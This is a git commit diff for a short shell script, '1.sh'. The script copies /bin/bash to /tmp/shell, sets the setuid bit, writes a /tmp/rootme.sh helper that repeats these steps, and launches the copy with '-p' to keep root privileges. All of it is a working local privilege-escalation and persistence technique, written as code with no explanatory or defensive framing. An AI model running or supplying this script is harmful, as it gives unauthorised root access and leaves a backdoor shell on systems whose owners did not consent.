87be9e620cc043b24a530eca10143c2a782331b5
KısacaEnes <eneskorkmaz572@gmail.com>
2025-06-08 23:43:45 +0300

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,2 +1,6 @@
-echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/rootme.sh
+cp /bin/bash /tmp/shell
+chmod +s /tmp/shell
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/shell\nchmod +s /tmp/shell' > /tmp/rootme.sh
 chmod +x /tmp/rootme.sh
+/tmp/shell -p
+
